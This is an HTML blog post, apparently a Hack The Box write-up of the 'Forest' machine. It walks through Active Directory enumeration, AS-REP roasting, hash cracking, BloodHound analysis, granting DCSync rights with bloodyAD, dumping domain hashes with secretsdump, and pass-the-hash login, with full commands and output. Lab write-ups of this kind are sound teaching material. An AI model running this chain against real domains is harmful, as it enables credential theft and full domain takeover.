@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB - Forest — 0xma1ware</title>
+  <meta name="description" content="Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a blo">
+  <meta name="author" content="ma1ware">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://0xma1ware.github.io/posts/forest.html">
+  <meta property="og:title" content="HTB - Forest">
+  <meta property="og:description" content="Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a blo">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://0xma1ware.github.io/posts/forest.html">
+  <meta property="og:image" content="https://0xma1ware.github.io/favicon.ico">
+  <meta property="article:published_time" content="2025-03-01">
+  <meta property="article:author" content="ma1ware">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@0xma1ware">
+  <meta name="twitter:title" content="HTB - Forest">
+  <meta name="twitter:description" content="Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a blo">
+  <link rel="icon" href="../favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org", "@type": "BlogPosting",
+    "headline": "HTB - Forest", "description": "Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a blo",
+    "datePublished": "2025-03-01",
+    "author": { "@type": "Person", "name": "ma1ware", "url": "https://github.com/0xma1ware" },
+    "publisher": { "@type": "Person", "name": "ma1ware" },
+    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://0xma1ware.github.io/posts/forest.html" }
+  }
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
+    <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('.site-nav').classList.toggle('open')">
+      <span></span><span></span><span></span>
+    </button>
+    <nav><ul class="site-nav">
+      <li><a href="../">home</a></li>
+      <li><a href="https://github.com/0xma1ware" target="_blank" rel="noopener">github</a></li>
+      <li><a href="https://x.com/0xma1ware" target="_blank" rel="noopener">x.com</a></li>
+    </ul></nav>
+  </header>
+
+  <div class="post-header animate-in">
+    <a href="../" class="back-link">&larr; back to all posts</a>
+    <h1>HTB - Forest</h1>
+    <div class="post-meta">
+      <span>2025-03-01</span>
+      <span class="category ">htb</span>
+      <span class="diff easy">easy</span>
+      <span>by ma1ware</span>
+    </div>
+    <div class="tags" style="margin-top:.75rem;"><span class="tag">AD</span><span class="tag">ASREPRoasting</span><span class="tag">DCSync</span><span class="tag">bloodhound</span><span class="tag">winrm</span></div>
+  </div>
+
+  <article class="post-content animate-in">
+    <div class="toc"><div class="toc-title">// Table of Contents</div><ul><li class="toc-h1"><a href="#introduction">Introduction</a></li><li class="toc-h1"><a href="#enumeration">Enumeration</a></li><li class="toc-h2"><a href="#port-enumeration">Port Enumeration</a></li><li class="toc-h4"><a href="#smb-enumeration">SMB Enumeration</a></li><li class="toc-h4"><a href="#kerberos-enumeration-user-enumeration">Kerberos enumeration (User enumeration)</a></li><li class="toc-h1"><a href="#initial-access">Initial Access</a></li><li class="toc-h4"><a href="#getting-some-credz">Getting some credz</a></li><li class="toc-h4"><a href="#bloodhound-analysis">Bloodhound analysis</a></li><li class="toc-h4"><a href="#usertxt">user.txt</a></li><li class="toc-h1"><a href="#post-exploitation">Post-Exploitation</a></li><li class="toc-h4"><a href="#privilege-escalation">Privilege escalation</a></li></ul></div>
+    <h1 id="introduction">Introduction</h1>
+<p>Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a bloodhound ingestor in order to understand what type of AD envrionment I am dealing with. I can also use these credentials to login into the box using WinRM. Using what I learned from bloodhound, I add DCSync privileges to myself and exploit the box to get administrator access.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="port-enumeration">Port Enumeration</h2>
+<p>Target IP Address: 10.129.108.125</p>
+<p>We run an intial port scan in order to find out what we are dealing with.  </p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>nmap<span style="color: #F8F8F2"> </span>-T4<span style="color: #F8F8F2"> </span>-F<span style="color: #F8F8F2"> </span>-oA<span style="color: #F8F8F2"> </span>scans/initial<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.161<span style="color: #F8F8F2"> </span>-Pn<span style="color: #F8F8F2"> </span>-v
+</code></pre></div>
+
+<p>This gives us the following output:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>PORT<span style="color: #F8F8F2">     </span>STATE<span style="color: #F8F8F2"> </span>SERVICE
+<span style="color: #AE81FF">53</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>domain
+<span style="color: #AE81FF">88</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>kerberos-sec
+<span style="color: #AE81FF">135</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>msrpc
+<span style="color: #AE81FF">139</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>netbios-ssn
+<span style="color: #AE81FF">389</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ldap
+<span style="color: #AE81FF">445</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>microsoft-ds
+<span style="color: #AE81FF">464</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>kpasswd5
+<span style="color: #AE81FF">593</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http-rpc-epmap
+<span style="color: #AE81FF">636</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ldapssl
+<span style="color: #AE81FF">3268</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>globalcatLDAP
+<span style="color: #AE81FF">3269</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>globalcatLDAPssl
+<span style="color: #AE81FF">5985</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>wsman
+</code></pre></div>
+
+<p>So, the target machine appears to be an active directory box with the usual services running.</p>
+<p>Firstly, I can generate the <code>/etc/hosts</code> file using nxc.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--generate-hosts-file<span style="color: #F8F8F2"> </span>scans/hosts
+
+<span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">     </span>FOREST.htb.local<span style="color: #F8F8F2"> </span>htb.local<span style="color: #F8F8F2"> </span>FOREST
+</code></pre></div>
+
+<h6 id="hint">Hint</h6>
+<p>The reason for using nxc to generate the /etc/hosts file is because when I myself write down an entry in /etc/hosts I do not follow the convention. This is also true for most other people. This was mostly popularised by 0xdf and ippsec, and it was very quickly patched by the developers of nxc.<br />
+For more information, you can refer to these links: <br><br />
+<a href="https://x.com/0xdf_/status/1898386186361532467">0xdf's first tweet</a> <br><br />
+<a href="https://x.com/0xdf_/status/1901697269641990199">0xdf's second tweet</a> <br><br />
+<a href="https://x.com/ippsec/status/1916207825002377718">ippsec's tweet</a> <br><br />
+<a href="https://github.com/Pennyw0rth/NetExec/pull/663">nxc pull request</a> <br></p>
+<h4 id="smb-enumeration">SMB Enumeration</h4>
+<p>I move onto enumerating SMB by checking for null authentication and guest access.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--shares<span style="color: #F8F8F2">                         </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">    </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>FOREST<span style="color: #F8F8F2">           </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2016</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">14393</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:FOREST<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:htb.local<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">    </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>FOREST<span style="color: #F8F8F2">           </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>htb.local<span style="color: #AE81FF">\:</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">    </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>FOREST<span style="color: #F8F8F2">           </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Error<span style="color: #F8F8F2"> </span>enumerating<span style="color: #F8F8F2"> </span>shares:<span style="color: #F8F8F2"> </span>STATUS_ACCESS_DENIED
+~/htb/boxes/OSCP-PREP/Forest<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;guest&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--shares
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">    </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>FOREST<span style="color: #F8F8F2">           </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2016</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">14393</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:FOREST<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:htb.local<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.8.176<span style="color: #F8F8F2">    </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>FOREST<span style="color: #F8F8F2">           </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>htb.local<span style="color: #AE81FF">\g</span>uest:<span style="color: #F8F8F2"> </span>STATUS_ACCOUNT_DISABLED<span style="color: #F8F8F2"> </span>
+</code></pre></div>
+
+<p>I am not surprised that I can't use them. Moving on, we do manage to learn a few bits of information.</p>
+<p>Mainly that the target is running Windows 10 Server 2016 Build 14393 x64</p>
+<p>Running enum4linux we also learn a few more important details like the following:</p>
+<ul>
+<li>Domain SID: S-1-5-21-3072663084-364016917-1341370565</li>
+<li>Password history length: 24</li>
+<li>Minimum password length: 7</li>
+</ul>
+<h4 id="kerberos-enumeration-user-enumeration">Kerberos enumeration (User enumeration)</h4>
+<p>It doesn't seem like I can find anything more interesting with SMB, so I quickly move onto Kerberos.</p>
+<p>We can enumerate usernames using kerbrute's userenum feature. Kerbrute also has a <code>-o</code> feature to output the content to a log file, so there is really no point in using tee <code>^_^</code>.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest 1m 10s ❯ kerbrute userenum --dc FOREST.htb.local -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  | tee scans/kerbrute.out
+
+
+2025/03/22 17:35:23 &gt;  [+] VALID USERNAME:       mark@htb.local
+2025/03/22 17:35:26 &gt;  [+] VALID USERNAME:       andy@htb.local
+2025/03/22 17:35:55 &gt;  [+] VALID USERNAME:       forest@htb.local
+2025/03/22 17:36:18 &gt;  [+] VALID USERNAME:       administrator@htb.local
+2025/03/22 17:38:27 &gt;  [+] VALID USERNAME:       sebastien@htb.local
+2025/03/22 17:42:11 &gt;  [+] VALID USERNAME:       santi@htb.local
+2025/03/22 17:42:56 &gt;  [+] VALID USERNAME:       lucinda@htb.local
+
+[duplicates removed]
+</code></pre></div>
+
+<p>I do maange to find out a bunch of usernames, but since it's case-insensitive, I removed the duplicates from the output because that's just redundant.</p>
+<h1 id="initial-access">Initial Access</h1>
+<h4 id="getting-some-credz">Getting some credz</h4>
+<p>We don't really have any credentials to speak of, so a kerberoasting attack is off the table currently. Here is what the output would look like if you ran it anyway:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ impacket-GetUserSPNs htb.local/ -dc-ip 10.129.8.176                                      
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+No entries found!
+</code></pre></div>
+
+<p>What we can check is to see if any user has non-preauth AS_REP. We can do this by using impacket's handy <code>impacket-GetNPUsers</code>. I assume that NP stands for no preauth.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ impacket-GetNPUsers htb.local/ -request -dc-ip 10.129.8.176                                                                                                                        
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-03-22 17:43:00.972433  2019-09-23 14:09:47.931194  0x410200 
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:786f2c92f1f3232aca14adb1a4bcefbb$d1ce68f6b73a7b38230f03ba3c479520a7ff84c19dbe3a098068c158edda88be28b71fa1f7adc002dad2e01416cbf795202c6a2fd6c657cede52115e022d7df75a48cc79953498e7823e8ada7772783455b7da11222b13155507b68e0772d9ace3b15cd44a5d0de91c539841a19865c81de2aa6f39c770f120ad84eaea879abe2c0e68cbabcbd3ceb98c4a2bcffe0121b7deb9b8df69307685441e135f82e5a230b535fbc395bda6b62c79746e2bf85ddc8093fc6df2710a5e665a551651e248abd32ff1fbf8b8ceaf414501ddf07d2af0afcef28454772e447ccdbd550e842cae9fc3b2bf65
+</code></pre></div>
+
+<p>We do manage to find a hash belonging to svc-alfresco, we can use hashcat to crack it.</p>
+<p>Hashcat mode is: 18200</p>
+<p>Running the following:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>hashcat -a 0 -m 18200 ./hash ./rockyou.txt
+</code></pre></div>
+
+<p>This eventually cracks to the following password of <code>s3rvice</code></p>
+<p>So the first pair of credentials that we have are:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>svc-alfresco / s3rvice
+</code></pre></div>
+
+<h4 id="bloodhound-analysis">Bloodhound analysis</h4>
+<p>Using the credentials we managed to discover I run a bloodhound-ingestor to gather data.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ bloodhound-python -d htb.local -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39; --zip -c All -ns 10.129.8.176
+[...snip...]
+</code></pre></div>
+
+<h6 id="hint-1">Hint</h6>
+<p>I have since stopped using this particular ingestion agent, because most newer boxes now have the CE (Community Edition) of bloodhound. There is a new version of this particular ingestor by the name of bloodhound-ce-python, but I just use rusthound-ce myself.<br />
+https://github.com/g0h4n/RustHound-CE</p>
+<p>I have found that bloodhound-python might miss some things on this box, so I recommend that you also use rusthound-ce. </p>
+<p>Back to the box.</p>
+<p>We learn that svc-alfresco is part of the Service Accounts group (this is also denoted by the fact that it has a username prefix of svc) which itself is a member of the Privileged IT Accounts which are then a member of the Remote Management Users and Account Operator groups. </p>
+<p>To put it simply:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>svc-alfresco - member of - &gt; Service Accounts (Group) - member of - &gt; Privileged IT Accounts (Group)|- member of - 
+                                                    |
+                                                    -&gt; Remote Management Users (Group)
+                                                    |                           
+                                                    -&gt; Account Operator (Group)
+</code></pre></div>
+
+<p>This means we can use winrm to login into the box.</p>
+<h4 id="usertxt">user.txt</h4>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest/bh<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>evil-winrm<span style="color: #F8F8F2"> </span>-i<span style="color: #F8F8F2"> </span>htb.local<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>svc-alfresco<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;s3rvice&#39;</span>
+
+Evil-WinRM<span style="color: #F8F8F2"> </span>shell<span style="color: #F8F8F2"> </span>v3.7<span style="color: #F8F8F2">                                                                                                                                                                                              </span>
+
+Warning:<span style="color: #F8F8F2"> </span>Remote<span style="color: #F8F8F2"> </span>path<span style="color: #F8F8F2"> </span>completions<span style="color: #F8F8F2"> </span>is<span style="color: #F8F8F2"> </span>disabled<span style="color: #F8F8F2"> </span>due<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>ruby<span style="color: #F8F8F2"> </span>limitation:<span style="color: #F8F8F2"> </span>undefined<span style="color: #F8F8F2"> </span>method<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span>quoting_detection_proc<span style="color: #ED007E; background-color: #1E0010">&#39;</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>module<span style="color: #F8F8F2"> </span>Reline<span style="color: #F8F8F2">                            </span>
+
+Data:<span style="color: #F8F8F2"> </span>For<span style="color: #F8F8F2"> </span>more<span style="color: #F8F8F2"> </span>information,<span style="color: #F8F8F2"> </span>check<span style="color: #F8F8F2"> </span>Evil-WinRM<span style="color: #F8F8F2"> </span>GitHub:<span style="color: #F8F8F2"> </span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion<span style="color: #F8F8F2">                                       </span>
+
+Info:<span style="color: #F8F8F2"> </span>Establishing<span style="color: #F8F8F2"> </span>connection<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>remote<span style="color: #F8F8F2"> </span>endpoint<span style="color: #F8F8F2">                                                                                                                                                                   </span>
+*Evil-WinRM*<span style="color: #F8F8F2"> </span>PS<span style="color: #F8F8F2"> </span>C:<span style="color: #AE81FF">\U</span>sers<span style="color: #AE81FF">\s</span>vc-alfresco<span style="color: #AE81FF">\D</span>ocuments&gt;<span style="color: #F8F8F2"> type </span>C:<span style="color: #AE81FF">\U</span>sers<span style="color: #AE81FF">\s</span>vc-alfresco<span style="color: #AE81FF">\D</span>esktop<span style="color: #AE81FF">\u</span>ser.txt
+eb70021e85f5435b71da8989c174be5f
+</code></pre></div>
+
+<h1 id="post-exploitation">Post-Exploitation</h1>
+<h4 id="privilege-escalation">Privilege escalation</h4>
+<p>Analysing the bloodhound output more carefully we find that account operators has GenericAll permissions on the Exchange Windows Permisions (Group) which then has WriteDacl on -&gt; HTB.LOCAL.</p>
+<p>This is a pretty basic AD chain that we can exploit. I will do this in steps</p>
+<p><code>1.</code> Exploiting GenricAll permissions on Exchange Windows Permisions</p>
+<p>'GenricAll permissions' is a fancy term that basically means that wen can do whatever we want with this AD object. The first things that comes to find is that I can simply add myself to this group. There are multiple ways to do this, but I will use bloodyAD since I like the tool very much and find it useful.</p>
+<h6 id="hint-2">Hint</h6>
+<p>If you are unfamiliar with I highly recommend getting to know it well. It will help you a lot in attacking AD environments. </p>
+<p>Back to the box.</p>
+<p>The syntax is pretty easy to understand, so I don't believe that it requires any explanation.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>bloodyAD<span style="color: #F8F8F2"> </span>--host<span style="color: #F8F8F2"> </span>FOREST.htb.local<span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span>htb.local<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;svc-alfresco&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;s3rvice&#39;</span><span style="color: #F8F8F2"> </span>add<span style="color: #F8F8F2"> </span>groupMember<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;Exchange Windows Permissions&quot;</span><span style="color: #F8F8F2"> </span>svc-alfresco
+<span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>svc-alfresco<span style="color: #F8F8F2"> </span>added<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>Exchange<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Permissions
+</code></pre></div>
+
+<p>Moving onto step 2 now.</p>
+<p><code>2.</code> Exploiting WriteDacl on HTB.LOCAL</p>
+<p>Now we can abuse the permissions this group has to grant our user DcSync privileges. Once again I am using bloodyAD</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ bloodyAD --host FOREST.htb.local -d htb.local -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39; add dcsync svc-alfresco
+[+] svc-alfresco is now able to DCSync
+</code></pre></div>
+
+<p>We can now abuse this ability to sync domain controllers by tricking the target into thinking we are another DC. This is a geniuine feature used in AD environments that we will abuse for funz. This allows us to get all the credentialz we need using the MS-DRSR protocol.</p>
+<p>Now we can use secretsdump to get all the hashes!</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ impacket-secretsdump &#39;htb.local&#39;/&#39;svc-alfresco&#39;:&#39;s3rvice&#39;@&#39;FOREST.htb.local&#39;                                                    
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+[...snip...]
+</code></pre></div>
+
+<p>We can now use evil-winrm to login to the box:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Forest ❯ evil-winrm -i htb.local -u Administrator -H &#39;32693b11e6aa90eb43d32c72a07ceea6&#39; 
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;type C:\Users\Administrator\Desktop\root.txt
+c3fc30f3513fcbdd6703da501b395cb1
+</code></pre></div>
+
+<p>That's the box! I hope you enjoyed it :)</p>
+  </article>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="https://github.com/0xma1ware" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://x.com/0xma1ware" target="_blank" rel="noopener">X / Twitter</a>
+      <a href="mailto:ma1ware@protonmail.com">Email</a>
+    </div>
+    <p>&copy; 2025 0xma1ware. All rights reserved.</p>
+  </footer>
+</body>
+</html>
